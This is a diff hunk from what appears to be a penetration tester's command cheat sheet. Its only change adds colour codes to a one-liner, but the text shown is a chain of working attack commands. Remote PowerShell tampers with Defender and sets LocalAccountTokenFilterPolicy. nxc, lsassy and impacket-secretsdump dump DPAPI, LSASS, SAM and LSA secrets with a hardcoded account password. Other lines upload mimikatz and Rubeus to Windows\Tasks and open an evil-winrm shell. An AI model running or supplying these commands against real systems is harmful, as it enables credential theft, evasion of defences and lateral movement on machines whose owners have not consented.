@@ -1544,7 +1544,7 @@ Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { Set-MpPr
 Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }
 
 +---------- dbf: Account Created ----------+
-(t=$TARGET; echo '--------------[ DPAPI ]';nxc smb $t -u dbf -p '123qweasdF!' --dpapi --local-auth; echo '--------------[ LSASS ]';nxc smb $t -u dbf -p '123qweasdF!' -M lsassy --local-auth; echo '--------------[ SAM + SECRETS ]'; impacket-secretsdump 'dbf:123qweasdF!'@$t) | tee dump_$t
+(t=$TARGET; echo '\033[33m--------------[ DPAPI ]--------------\033[0m';nxc smb $t -u dbf -p '123qweasdF!' --dpapi --local-auth; echo '\033[33m--------------[ LSASS ]--------------\033[0m';nxc smb $t -u dbf -p '123qweasdF!' -M lsassy --local-auth; echo '\033[33m--------------[ SAM + SECRETS ]--------------\033[0m'; impacket-secretsdump 'dbf:123qweasdF!'@$t) | tee dump_$t
 nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe Windows\\Tasks\\mimikatz.exe
 nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/Rubeus.exe Windows\\Tasks\\Rubeus.exe
 evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
